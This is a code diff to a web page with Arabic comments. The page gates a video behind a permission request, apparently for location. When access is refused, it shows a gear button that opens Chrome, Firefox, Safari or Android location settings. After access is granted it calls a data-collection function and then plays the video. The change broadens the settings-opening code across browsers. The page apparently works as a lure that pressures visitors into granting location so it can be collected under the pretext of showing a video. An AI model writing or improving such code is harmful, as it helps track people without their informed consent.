@@ -288,7 +288,7 @@
             <div id="gearButton">
                 <div class="icon-gear">⚙️</div>
                 <div class="main-text">تغيير الإعدادات</div>
-                <div class="sub-text">اضغط لإظهار طلب الموقع</div>
+                <div class="sub-text">اضغط لفتح إعدادات الموقع في المتصفح</div>
             </div>
         </div>
 
@@ -331,10 +331,9 @@
             };
 
             // ===== متغيرات التحكم =====
-            let settingsOpened = false;      // هل تم فتح إعدادات المتصفح؟
+            let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
-            let permissionGranted = false;
 
             // ===== عناصر DOM =====
             const playBtn = document.getElementById('playButtonOverlay');
@@ -377,46 +376,50 @@
             // ===== فتح إعدادات الموقع في المتصفح (وليس إعدادات الجهاز) =====
             function openBrowserLocationSettings() {
                 const ua = navigator.userAgent;
-                // محاولة فتح إعدادات الموقع في Chrome
+
+                // محاولة فتح صفحة إعدادات الموقع في Chrome
                 if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
-                    // محاولة فتح صفحة إعدادات الموقع في Chrome
                     try {
-                        window.location.href = 'chrome://settings/content/location';
+                        window.open('chrome://settings/content/location', '_blank');
                         return;
                     } catch (e) {}
                 }
-                // بديل: فتح إعدادات تطبيق Chrome (قد تصل إلى إعدادات الموقع من هناك)
+
+                // محاولة فتح إعدادات الموقع في Firefox
+                if (/Firefox/.test(ua)) {
+                    try {
+                        window.open('about:preferences#privacy', '_blank');
+                        return;
+                    } catch (e) {}
+                }
+
+                // محاولة فتح إعدادات الموقع في Safari (ماك)
+                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+                    try {
+                        window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                        return;
+                    } catch (e) {}
+                }
+
+                // محاولة فتح إعدادات الموقع في Android (تطبيق Chrome)
                 if (/Android/.test(ua)) {
+                    // محاولة فتح إعدادات التطبيق (Chrome)
                     try {
                         window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
                         return;
                     } catch (e) {}
+                    // بديل: فتح إعدادات الموقع في النظام
+                    try {
+                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        return;
+                    } catch (e) {}
                 }
-                // خيار أخير: فتح إعدادات الموقع في النظام (لكن هذا ليس مثاليًا)
-                // سنستخدم الطريقة القديمة كحل أخير
-                if (/Android/i.test(ua)) {
-                    const intents = [
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent:#Intent;action=android.settings.SETTINGS;end'
-                    ];
-                    for (let intent of intents) {
-                        try {
-                            window.location.href = intent;
-                            break;
-                        } catch (e) {}
-                    }
-                } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                    setTimeout(() => {
-                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
-                    }, 500);
-                } else if (/Windows/i.test(ua)) {
-                    window.open('ms-settings:privacy-location', '_blank');
-                } else if (/Mac/i.test(ua)) {
-                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-                } else {
+
+                // خيار أخير: فتح إعدادات الموقع في النظام (لجميع المتصفحات)
+                try {
                     window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                } catch (e) {
+                    alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
                 }
             }
 
@@ -642,7 +645,6 @@
                     // نطلب الصلاحية مرة أخرى (ستظهر نافذة الطلب إذا كان الإعداد "اسأل")
                     const granted = await requestPermissions();
                     if (granted) {
-                        permissionGranted = true;
                         hideGearButton();
                         await collectAndPlay();
                     } else {
@@ -656,7 +658,6 @@
                 const granted = await requestPermissions();
                 if (granted) {
                     // تم السماح فوراً
-                    permissionGranted = true;
                     await collectAndPlay();
                 } else {
                     // تم الحظر أو الرفض: نعرض زر الترس
@@ -679,7 +680,6 @@
                     (async () => {
                         const granted = await requestPermissions();
                         if (granted) {
-                            permissionGranted = true;
                             hideGearButton();
                             await collectAndPlay();
                         } else {
